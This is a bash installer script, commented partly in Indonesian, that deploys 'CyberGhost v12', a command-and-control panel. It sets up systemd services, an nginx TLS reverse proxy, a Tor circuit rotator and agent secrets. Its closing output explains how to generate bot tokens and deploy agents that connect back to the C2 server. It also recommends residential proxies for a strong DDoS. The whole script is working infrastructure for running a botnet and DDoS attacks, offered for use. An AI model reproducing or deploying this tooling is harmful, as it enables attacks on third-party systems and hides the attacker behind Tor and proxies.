#!/usr/bin/env bash
set -euo pipefail

DOMAIN="${1:-}"
APP_DIR="/opt/cyberghost"
PY="python3.11"

if ! command -v "$PY" >/dev/null 2>&1; then
  echo "[+] installing $PY"
  apt-get update
  apt-get install -y software-properties-common
  add-apt-repository -y ppa:deadsnakes/ppa
  apt-get update
  apt-get install -y python3.11 python3.11-venv python3.11-dev
fi

apt-get install -y python3-pip nginx certbot python3-certbot-nginx tor
systemctl enable --now tor

mkdir -p "$APP_DIR"
cp app.py tor.py requirements.txt "$APP_DIR/"
mkdir -p "$APP_DIR/web"

cd "$APP_DIR"
"$PY" -m venv venv
./venv/bin/pip install --upgrade pip wheel setuptools
./venv/bin/pip install -r requirements.txt

if [ ! -f "$APP_DIR/proxies.txt" ]; then
  cat > "$APP_DIR/proxies.txt" <<'EOF'
# format: scheme://[user:pass@]host:port
# contoh:
# socks5://user:pass@1.2.3.4:1080
# http://user:pass@5.6.7.8:8080
# socks5h://9.10.11.12:1080
EOF
fi

ADMIN_HASH_VAL="${CG_ADMIN_HASH:-}"
if [ -z "$ADMIN_HASH_VAL" ]; then
  echo
  echo "[!] CG_ADMIN_HASH belum di-set. Isi password admin:"
  read -sr ADMIN_PASS
  echo
  if [ -n "$ADMIN_PASS" ]; then
    ADMIN_HASH_VAL=$(CG_ADMIN_PASS="$ADMIN_PASS" "$APP_DIR/venv/bin/python" -c \
      "import os; from passlib.context import CryptContext; print(CryptContext(schemes=['bcrypt']).hash(os.environ['CG_ADMIN_PASS']))")
  fi
fi

if [ -z "$ADMIN_HASH_VAL" ]; then
  echo "[!] ADMIN_HASH kosong. Login admin akan DITOLAK sampai CG_ADMIN_HASH diisi."
fi

JWT_SECRET_VAL="${CG_JWT_SECRET:-$(openssl rand -hex 32)}"
AGENT_SECRET_VAL="${CG_AGENT_SECRET:-$(openssl rand -hex 32)}"

cat > /etc/systemd/system/cyberghost.service <<EOF
[Unit]
Description=CyberGhost C2 Panel
After=network.target tor.service

[Service]
Type=simple
WorkingDirectory=$APP_DIR
Environment="CG_ADMIN_HASH=$ADMIN_HASH_VAL"
Environment="CG_JWT_SECRET=$JWT_SECRET_VAL"
Environment="CG_AGENT_SECRET=$AGENT_SECRET_VAL"
Environment="CG_TLS_CERT=/etc/letsencrypt/live/$DOMAIN/fullchain.pem"
Environment="CG_TLS_KEY=/etc/letsencrypt/live/$DOMAIN/privkey.pem"
Environment="CG_REQUIRE_TLS=${CG_REQUIRE_TLS:-1}"
Environment="CG_REQUIRE_PROXY=${CG_REQUIRE_PROXY:-0}"
Environment="CG_USE_TOR=${CG_USE_TOR:-0}"
Environment="CG_TOR_GATEWAY=${CG_TOR_GATEWAY:-socks5://127.0.0.1:9050}"
Environment="CG_PROXIES_FILE=$APP_DIR/proxies.txt"
ExecStart=$APP_DIR/venv/bin/python $APP_DIR/app.py --workers 4
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

cat > /etc/systemd/system/cyberghost-tor.service <<EOF
[Unit]
Description=CyberGhost Tor Circuit Rotator
After=tor.service

[Service]
Type=simple
WorkingDirectory=$APP_DIR
ExecStart=$APP_DIR/venv/bin/python $APP_DIR/tor.py --mode rotate --interval 30
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable cyberghost
systemctl enable cyberghost-tor

if [ -n "$DOMAIN" ]; then
cat > /etc/nginx/sites-available/cyberghost <<EOF
server {
    listen 80;
    server_name $DOMAIN;
    return 301 https://\$host\$request_uri;
}
server {
    listen 443 ssl http2;
    server_name $DOMAIN;

    ssl_certificate     /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;

    client_max_body_size 16m;
    proxy_read_timeout 3600s;
    proxy_send_timeout 3600s;

    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
}
EOF
ln -sf /etc/nginx/sites-available/cyberghost /etc/nginx/sites-enabled/cyberghost
rm -f /etc/nginx/sites-enabled/default
nginx -t && systemctl reload nginx
certbot --nginx -d "$DOMAIN" --non-interactive --agree-tos --register-unsafely-without-email || true
systemctl restart cyberghost
else
cat > /etc/nginx/sites-available/cyberghost <<EOF
server {
    listen 80 default_server;
    server_name _;
    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
    }
}
EOF
ln -sf /etc/nginx/sites-available/cyberghost /etc/nginx/sites-enabled/cyberghost
rm -f /etc/nginx/sites-enabled/default
nginx -t && systemctl reload nginx
systemctl restart cyberghost
fi

echo
echo "[+] CyberGhost v12 installed at $APP_DIR"
echo "[+] Panel:      $([ -n "$DOMAIN" ] && echo "https://$DOMAIN" || echo "http://SERVER_IP")"
echo "[+] Admin user: ${CG_ADMIN_USER:-ghost}"
echo "[+] JWT secret: ${JWT_SECRET_VAL:0:8}… (tersimpan di systemd unit)"
echo "[+] Agent token generator:"
echo "      $APP_DIR/venv/bin/python $APP_DIR/app.py --gen-token <bot_id>"
echo "[+] Agent deploy:"
echo "      python app.py --agent --c2 wss://$DOMAIN --token <BOT_TOKEN> --workers 4"
echo "[+] Tor rotator: systemctl status cyberghost-tor"
echo "[+] Populate $APP_DIR/proxies.txt dengan residential proxy untuk DDoS kuat."
